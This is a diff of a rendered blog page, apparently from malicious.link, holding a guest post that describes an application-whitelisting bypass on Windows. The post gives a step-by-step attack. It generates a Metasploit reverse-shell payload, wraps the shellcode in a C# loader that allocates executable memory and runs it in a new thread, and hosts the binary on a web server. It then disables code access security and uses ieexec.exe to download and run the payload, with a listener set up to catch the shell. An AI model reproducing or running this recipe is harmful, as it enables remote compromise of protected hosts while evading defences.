@@ -30,7 +30,7 @@ The premise is, how can we maintain persistence in a corporate environment, usin
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -45,16 +45,13 @@ The premise is, how can we maintain persistence in a corporate environment, usin
 Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell &amp; Matthew Graeber
 I highly recommend that you start with this presentation as it lays the foundation for this post.
 The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.">
-
-
 <meta itemprop="datePublished" content="2014-01-16T11:30:44-05:00" />
 <meta itemprop="dateModified" content="2014-01-16T11:30:44-05:00" />
 <meta itemprop="wordCount" content="829">
 
 
 
-<meta itemprop="keywords" content="whitelisting,ieexec," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="whitelisting,ieexec," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Application Whitelist Bypass using IEexec.exe"/>
 <meta name="twitter:description" content="Guest post by @subTee There was a recent presentation at DerbyCon, entitled:
 Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation by Christopher Campbell &amp; Matthew Graeber
@@ -131,38 +128,23 @@ The premise is, how can we maintain persistence in a corporate environment, usin
             
 
             <div class="post-content">
-                
-
-<h2 id="guest-post-by-subtee-https-twitter-com-subtee">Guest post by <a href="https://twitter.com/subTee">@subTee</a></h2>
-
+                <h2 id="guest-post-by-subteehttpstwittercomsubtee">Guest post by <a href="https://twitter.com/subTee">@subTee</a></h2>
 <p>There was a recent presentation at DerbyCon, entitled:</p>
-
 <p><a href="http://www.youtube.com/watch?v=j-r6UonEkUw">Living Off the Land: A Minimalist’s Guide to Windows Post-Exploitation</a>
 by Christopher Campbell &amp; Matthew Graeber</p>
-
 <p>I highly recommend that you start with this presentation as it lays the foundation for this post.</p>
-
 <p>The premise is, how can we maintain persistence in a corporate environment, using tools and defaults provided by the host OS we have compromised. This is a very important concept, given the shift in many organizations to an Application Whitelisting Defense model.</p>
-
 <p>It is only a matter of time before time before you might encounter an Application Whitelisting Defense.</p>
-
 <p>As a follow up to that presentation, I began exploring the binaries that ship by default with Windows.  That is where I stumbled across a binary in the <code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727</code> path.</p>
-
 <p>The Executable is ieexec.exe. A write up is here: <a href="http://support.microsoft.com/kb/822485">http://support.microsoft.com/kb/822485</a></p>
-
 <blockquote>
 <p>“The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.”</p>
 </blockquote>
-
 <p>Excellent! So, now we just need to host our malicious binary , and call it from ieexec.exe.</p>
-
 <p>This is great, since most Application Whitelisting Environments are going to “Trust” anything signed my Microsoft as a matter of convenience. IEexec.exe will download and execute our code for us, all under the trusted process.</p>
-
 <p>So lets get started!</p>
-
 <p><strong>Step 1.</strong> Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
 From msfconsole:</p>
-
 <pre><code>msf &gt; use windows/x64/shell/reverse_tcp
 msf payload(reverse_tcp) &gt; set LHOST x.x.x.x
 msf payload(reverse_tcp) &gt; set LPORT 443
@@ -171,150 +153,120 @@ msf payload(reverse_tcp) &gt; generate -t csharp
 byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52...
 
  &lt;Snipped Full ShellCode for Brevity&gt;
-</code></pre>
-
-<p><strong>Step 2.</strong> Create the .NET wrapper application</p>
-
-<pre><code class="language-csharp">using System; 
-using System.Runtime.InteropServices; 
-namespace native 
+</code></pre><p><strong>Step 2.</strong> Create the .NET wrapper application</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">using</span> System; 
+<span style="color:#66d9ef">using</span> System.Runtime.InteropServices; 
+<span style="color:#66d9ef">namespace</span> native 
 { 
-    class Program 
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span> 
     { 
-            private static UInt32 MEM_COMMIT = 0x1000; 
-            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; 
-            private static UInt32 MEM_RELEASE = 0x8000; 
+            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 MEM_COMMIT = <span style="color:#ae81ff">0</span>x1000; 
+            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span style="color:#ae81ff">0</span>x40; 
+            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 MEM_RELEASE = <span style="color:#ae81ff">0</span>x8000; 
 
-        public static void Main(string[] args) 
+        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args) 
         { 
-            // native function's compiled code 
-
-            byte[] proc = new byte[] { 
-                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52... 
+            <span style="color:#75715e">// native function&#39;s compiled code 
+</span><span style="color:#75715e"></span>
+            <span style="color:#66d9ef">byte</span>[] proc = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] { 
+                <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52... 
             
-            //Edited ShellCode For Brevity 
-            }; 
+            <span style="color:#75715e">//Edited ShellCode For Brevity 
+</span><span style="color:#75715e"></span>            }; 
 
-            UInt32 funcAddr = VirtualAlloc(0, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
-            Marshal.Copy(proc, 0, (IntPtr)(funcAddr), proc.Length); 
+            UInt32 funcAddr = VirtualAlloc(<span style="color:#ae81ff">0</span>, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+            Marshal.Copy(proc, <span style="color:#ae81ff">0</span>, (IntPtr)(funcAddr), proc.Length); 
             IntPtr hThread = IntPtr.Zero; 
-            UInt32 threadId = 0; 
+            UInt32 threadId = <span style="color:#ae81ff">0</span>; 
 
-            // prepare data 
-
-            PROCESSOR_INFO info = new PROCESSOR_INFO(); 
-            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PROCESSOR_INFO))); 
-            Marshal.StructureToPtr(info, pinfo, false); 
+            <span style="color:#75715e">// prepare data 
+</span><span style="color:#75715e"></span>
+            PROCESSOR_INFO info = <span style="color:#66d9ef">new</span> PROCESSOR_INFO(); 
+            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(<span style="color:#66d9ef">typeof</span>(PROCESSOR_INFO))); 
+            Marshal.StructureToPtr(info, pinfo, <span style="color:#66d9ef">false</span>); 
             
-            // execute native code 
+            <span style="color:#75715e">// execute native code 
+</span><span style="color:#75715e"></span>
+            hThread = CreateThread(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, funcAddr, pinfo, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">ref</span> threadId); 
+            WaitForSingleObject(hThread, <span style="color:#ae81ff">0</span>xFFFFFFFF); 
 
-            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); 
-            WaitForSingleObject(hThread, 0xFFFFFFFF); 
-
-            // retrive data 
-
-            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, typeof(PROCESSOR_INFO)); 
+            <span style="color:#75715e">// retrive data 
+</span><span style="color:#75715e"></span>
+            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, <span style="color:#66d9ef">typeof</span>(PROCESSOR_INFO)); 
             Marshal.FreeHGlobal(pinfo); 
             CloseHandle(hThread);
-            VirtualFree((IntPtr)funcAddr, 0, MEM_RELEASE); 
+            VirtualFree((IntPtr)funcAddr, <span style="color:#ae81ff">0</span>, MEM_RELEASE); 
         } 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern bool CloseHandle(IntPtr handle); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern IntPtr GetModuleHandle( string moduleName ); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern UInt32 LoadLibrary( string lpFileName ); 
-
-        [DllImport(&quot;kernel32&quot;)] 
-        private static extern UInt32 GetLastError();
-        
-        [StructLayout(LayoutKind.Sequential)] 
-        internal struct PROCESSOR_INFO 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span style="color:#66d9ef">ref</span> UInt32 lpThreadId ); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> CloseHandle(IntPtr handle); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr GetModuleHandle( <span style="color:#66d9ef">string</span> moduleName ); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 GetProcAddress( IntPtr hModule, <span style="color:#66d9ef">string</span> procName ); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 LoadLibrary( <span style="color:#66d9ef">string</span> lpFileName ); 
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 GetLastError();
+<span style="color:#a6e22e">        
+</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span> 
+        <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROCESSOR_INFO</span> 
         { 
-            public UInt32 dwMax; 
-            public UInt32 id0; 
-            public UInt32 id1; 
-            public UInt32 id2; 
-            public UInt32 dwStandard; 
-            public UInt32 dwFeature; 
+            <span style="color:#66d9ef">public</span> UInt32 dwMax; 
+            <span style="color:#66d9ef">public</span> UInt32 id0; 
+            <span style="color:#66d9ef">public</span> UInt32 id1; 
+            <span style="color:#66d9ef">public</span> UInt32 id2; 
+            <span style="color:#66d9ef">public</span> UInt32 dwStandard; 
+            <span style="color:#66d9ef">public</span> UInt32 dwFeature; 
 
-            // if AMD 
-            public UInt32 dwExt; 
+            <span style="color:#75715e">// if AMD 
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">public</span> UInt32 dwExt; 
         }
     } 
 }
-</code></pre>
-
-<p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>
-
+</code></pre></div><p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>
 <p><strong>Step 3.</strong> Host the Exe. For this example, I used Mongoose. Simple and Effective:</p>
-
 <p><a href="http://code.google.com/p/mongoose/">http://code.google.com/p/mongoose/</a></p>
-
 <p>By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.</p>
-
 <p><strong>Step 4.</strong> Setup your receiver:</p>
-
 <pre><code>msf payload(reverse_tcp) &gt; use exploit/multi/handler
 msf exploit(handler) &gt; set LHOST x.x.x.x
 msf exploit(handler) &gt; set LPORT 443
 msf exploit(handler) &gt; set PAYLOAD windows/x64/shell/reverse_tcp
 msf exploit(handler) &gt; exploit -j
-</code></pre>
-
-<p><strong>Step 5.</strong> From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.</p>
-
+</code></pre><p><strong>Step 5.</strong> From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.</p>
 <p><strong>CMD 1 Execute:</strong></p>
-
 <pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
-</code></pre>
-
-<p>￼
+</code></pre><p>￼
 <strong>CMD 2 Execute:</strong></p>
-
 <pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
-</code></pre>
-
-<p>There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.</p>
-
+</code></pre><p>There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.</p>
 <p>Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:</p>
-
-<p><img src="/images/2014/201401_whitelisting_1.png" alt="" /></p>
-
+<p><img src="/images/2014/201401_whitelisting_1.png" alt=""></p>
 <p>Now, on the same host&hellip;</p>
-
-<p><img src="/images/2014/201401_whitelisting_2.png" alt="" /></p>
-
+<p><img src="/images/2014/201401_whitelisting_2.png" alt=""></p>
 <p>Executes just fine!</p>
-
-<p><img src="/images/2014/201401_whitelisting_3.png" alt="" /></p>
-
+<p><img src="/images/2014/201401_whitelisting_3.png" alt=""></p>
 <p>Its important to distinguish what this technique is and what it is not. This is not an exploit or vulnerability. Rather this is one way to execute arbitraty code in an Application Whitelisting Environment.</p>
-
 <p><strong>Summary:</strong></p>
-
 <p>In this document we learned that even if a host is in a mode where only trusted approved applications can run. IEexec.exe can be used in certain situations to circumvent a Whitelist, since it is likely a trusted binary, since it is signed by Microsoft.</p>
-
 <p>Cheers,</p>
-
 <p>=&gt; <a href="https://twitter.com/subTee">@subTee</a></p>
 
             </div>
@@ -337,7 +289,7 @@ msf exploit(handler) &gt; exploit -j
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
